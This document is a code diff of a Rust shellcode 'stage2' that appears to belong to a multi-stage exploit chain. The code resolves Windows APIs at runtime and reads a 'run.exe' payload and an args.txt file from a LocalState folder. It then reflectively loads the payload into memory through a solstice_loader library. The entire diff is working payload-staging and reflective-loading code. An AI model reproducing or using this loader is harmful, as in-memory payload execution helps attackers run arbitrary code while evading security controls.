@@ -6,19 +6,27 @@
 #![no_main]
 
 use core::arch::asm;
+use core::ffi::c_void;
 use core::mem::MaybeUninit;
 use core::panic::PanicInfo;
 
 use shellcode_utils::prelude::*;
+use solstice_loader::{DependentModules, LoaderContext, RuntimeFns};
 
 #[panic_handler]
 fn panic(_info: &PanicInfo) -> ! {
     loop {}
 }
 
-const STAGE3_ENV_FILENAME: &str = concat!(r#"%LOCALAPPDATA%\..\LocalState\run.exe"#, "\0");
+const STAGE3_ENV_PAYLOAD_FILENAME: &str = concat!(r#"%LOCALAPPDATA%\..\LocalState\run.exe"#, "\0");
+const STAGE3_ENV_ARGS_FILENAME: &str = concat!(r#"%LOCALAPPDATA%\..\LocalState\args.txt"#, "\0");
+
 const STAGE2_ERROR_FILE_OPEN_FAILED: u64 = 0x200000000_00000001;
 const STAGE2_ERROR_FILE_READ_FAILED: u64 = 0x200000000_00000002;
+const STAGE2_ERROR_INVALID_UTF8: u64 = 0x200000000_00000003;
+
+#[global_allocator]
+static DO_NOT_USE_ALLOCATOR: DummyGlobalAlloc = DummyGlobalAlloc {};
 
 #[no_mangle]
 pub extern "C" fn main() -> u64 {
@@ -33,7 +41,7 @@ pub extern "C" fn main() -> u64 {
     // }
 
     let kernelbase_ptr = get_kernelbase().unwrap();
-    let kernel32_ptr = get_kernel32(kernelbase_ptr);
+    let kernel32_ptr = get_kernel32(kernelbase_ptr).unwrap();
 
     #[cfg(feature = "debug")]
     let OutputDebugStringA = fetch_output_debug_string(kernelbase_ptr);
@@ -48,104 +56,161 @@ pub extern "C" fn main() -> u64 {
 
     debug_print!("Hello from stage2");
 
-    let ReadFile = fetch_read_file(kernelbase_ptr);
-    let CreateFileA = fetch_create_file(kernelbase_ptr);
     let VirtualAlloc = fetch_virtual_alloc(kernelbase_ptr);
+    let VirtualFree = fetch_virtual_free(kernelbase_ptr);
     let VirtualProtect = fetch_virtual_protect(kernelbase_ptr);
-    let GetFileSize = fetch_get_file_size(kernelbase_ptr);
     let GetProcAddress = fetch_get_proc_address(kernelbase_ptr);
     let LoadLibraryA = fetch_load_library(kernelbase_ptr);
     let CreateThread = fetch_create_thread(kernelbase_ptr);
-    let RtlAddFunctionTable = kernel32_ptr.map(fetch_rtl_add_fn_table);
+    let RtlAddFunctionTable = fetch_rtl_add_fn_table(kernel32_ptr);
+    let GlobalAlloc = fetch_global_alloc(kernelbase_ptr);
+    let GlobalFree = fetch_global_free(kernelbase_ptr);
+    let GetFullPathNameA = fetch_get_full_path_name(kernelbase_ptr);
 
     let GetModuleHandleA = fetch_get_module_handle(kernelbase_ptr);
     let ExpandEnvironmentStringsA = fetch_expand_environment_strings(kernelbase_ptr);
 
+    macro_rules! heap_alloc {
+        ($size:expr) => {
+            unsafe { (GlobalAlloc)(0x40, $size) }
+        };
+    }
+
     let mut stage3_filename: MaybeUninit<[u8; 200]> = MaybeUninit::uninit();
     unsafe {
         (ExpandEnvironmentStringsA)(
-            STAGE3_ENV_FILENAME.as_ptr(),
+            STAGE3_ENV_PAYLOAD_FILENAME.as_ptr(),
             stage3_filename.as_mut_ptr() as *mut _,
             core::mem::size_of_val(&stage3_filename) as u32,
         );
     }
 
-    // Open the stage3 payload
-    let handle = unsafe {
-        CreateFileA(
-            stage3_filename.as_ptr() as *const i8,
-            CreateFileAccess::GenericRead as u32,
-            0,
-            core::ptr::null_mut() as PVOID,
-            4,    // OPEN_ALWAYS
-            0x80, // FILE_ATTRIBUTE_NORMAL
-            core::ptr::null_mut() as PVOID,
-        )
+    let file_funcs = FileReaderFuncs {
+        create_file: fetch_create_file(kernelbase_ptr),
+        read_file: fetch_read_file(kernelbase_ptr),
+        get_size: fetch_get_file_size(kernelbase_ptr),
+        virtual_alloc: VirtualAlloc,
+        close_handle: fetch_close_handle(kernelbase_ptr),
     };
 
-    if handle as usize == usize::MAX {
-        #[cfg(not(feature = "debug"))]
+    // Map the returned errors to hard constants since the constants have the upper bit set
+    // to signal which stage failed
+    let stage3_reader = FileReader::open(stage3_filename.as_ptr() as *const _, &file_funcs);
+    if stage3_reader.is_err() {
         return STAGE2_ERROR_FILE_OPEN_FAILED;
-
-        debug_print!("Opening stage2 file failed, got INVALID_HANDLE_VALUE");
-
-        debug_break!();
     }
+    let mut stage3_reader = unsafe { stage3_reader.unwrap_unchecked() };
 
-    let stage2_size = unsafe { GetFileSize(handle, core::ptr::null_mut()) };
-
-    // Allocate memory for the stage 2 payload
-    let stage3_data =
-        unsafe { VirtualAlloc(core::ptr::null_mut(), stage2_size as usize, 0x3000, 4) };
-
-    // Read the PE file into memory
-    let mut remaining_size = stage2_size;
-    let mut write_ptr = stage3_data;
-    while remaining_size > 0 {
-        let mut bytes_read = 0u32;
-
-        unsafe {
-            if ReadFile(
-                handle,
-                write_ptr,
-                remaining_size,
-                &mut bytes_read as *mut _,
-                core::ptr::null_mut(),
-            ) == 0
-            {
-                #[cfg(not(feature = "debug"))]
-                return STAGE2_ERROR_FILE_READ_FAILED;
-
-                debug_print!("Reading stage3 failed");
-
-                #[cfg(feature = "debug")]
-                debug_break!();
-            }
-            write_ptr = write_ptr.offset(bytes_read as _);
+    let pe_data = match stage3_reader.read_all() {
+        Ok((stage3_data, stage3_size)) => unsafe {
+            core::slice::from_raw_parts(stage3_data as *const u8, stage3_size as usize)
+        },
+        Err(FileReaderError::ReadFailed) => {
+            return STAGE2_ERROR_FILE_READ_FAILED;
         }
-        remaining_size -= bytes_read;
-    }
+        Err(FileReaderError::OpenFailed) => {
+            // Should be impossible but we'll handle it anyways for completeness
+            unreachable!();
+        }
+    };
 
-    let pe_data =
-        unsafe { core::slice::from_raw_parts(stage3_data as *const u8, stage2_size as usize) };
+    drop(stage3_reader);
 
-    // unsafe { asm!("int 3") };
-
-    debug_print!("Attempting to load PE");
+    let mut stage3_args_filename: MaybeUninit<[u8; 200]> = MaybeUninit::uninit();
     unsafe {
-        solstice_loader::reflective_loader(
-            pe_data,
-            VirtualAlloc,
-            VirtualProtect,
-            GetProcAddress,
-            LoadLibraryA,
-            CreateThread,
-            RtlAddFunctionTable,
-            GetModuleHandleA,
+        (ExpandEnvironmentStringsA)(
+            STAGE3_ENV_ARGS_FILENAME.as_ptr(),
+            stage3_args_filename.as_mut_ptr() as *mut _,
+            core::mem::size_of_val(&stage3_args_filename) as u32,
         );
     }
 
-    // unsafe { asm!("mov rax, 0x1337; ret") };
+    // Try loading stage 3's arguments. Fails gracefully if the file does not exist.
+    let stage3_args = FileReader::open(stage3_args_filename.as_ptr() as *const _, &file_funcs)
+        .ok()
+        .and_then(|mut args_reader| {
+            // Read the arguments to a buffer, create a new pointer array to hold all the args, then copy args over.
+            let raw_args = match args_reader.read_all() {
+                Ok((args_data, args_size)) => unsafe {
+                    core::slice::from_raw_parts(args_data as *const u8, args_size)
+                },
+                Err(FileReaderError::ReadFailed) => {
+                    return None;
+                }
+                Err(FileReaderError::OpenFailed) => {
+                    // Should be impossible but we'll handle it anyways for completeness
+                    unreachable!();
+                }
+            };
+
+            unsafe {
+                let image_name_length = (GetFullPathNameA)(
+                    stage3_filename.as_ptr() as *const _,
+                    0,
+                    core::ptr::null_mut(),
+                    core::ptr::null_mut(),
+                ) as usize;
+
+                let args_len = raw_args.len();
+                // 4 extra characters for the null terminator, quotes for the image name, and space separating image name and args
+                let args_full_len = args_len + image_name_length + 4;
+                let args_with_image_name = heap_alloc!(args_full_len) as *mut u8;
+                args_with_image_name.write(b'"');
+                let image_start = args_with_image_name.offset(1);
+
+                let written_chars = (GetFullPathNameA)(
+                    stage3_filename.as_ptr() as *const _,
+                    args_full_len as u32,
+                    image_start,
+                    core::ptr::null_mut(),
+                ) as isize;
+
+                image_start.offset(written_chars).write(b'"');
+                image_start.offset(written_chars + 1).write(b' ');
+
+                let prog_args_start = image_start.offset(written_chars + 2);
+
+                core::ptr::copy_nonoverlapping(raw_args.as_ptr(), prog_args_start, raw_args.len());
+
+                let args_slice = core::slice::from_raw_parts(args_with_image_name, args_full_len);
+                let utf8_args = match core::str::from_utf8(args_slice) {
+                    Ok(s) => s,
+                    Err(_) => return None,
+                };
+
+                (GlobalFree)(args_with_image_name as *mut _);
+                (VirtualFree)(raw_args.as_ptr() as *mut _, 0, 0x00008000);
+
+                let args = solstice_loader::utf8_to_utf16(utf8_args, VirtualAlloc);
+
+                Some(args)
+            }
+        });
+
+    debug_print!("Attempting to load PE");
+    let context = LoaderContext {
+        buffer: pe_data,
+        image_name: Some(&[
+            'r' as u16, 'u' as u16, 'n' as u16, '.' as u16, 'e' as u16, 'x' as u16, 'e' as u16,
+        ]),
+        args: stage3_args.as_deref(),
+        modules: DependentModules {
+            kernelbase: kernelbase_ptr as *mut _,
+        },
+        fns: RuntimeFns {
+            virtual_alloc: VirtualAlloc,
+            virtual_protect: VirtualProtect,
+            get_proc_address_fn: GetProcAddress,
+            load_library_fn: LoadLibraryA,
+            // TODO
+            create_thread_fn: CreateThread,
+            get_module_handle_fn: GetModuleHandleA,
+            rtl_add_function_table_fn: Some(RtlAddFunctionTable),
+        },
+    };
+    unsafe {
+        solstice_loader::reflective_loader(context);
+    }
 
     0x1337
 }
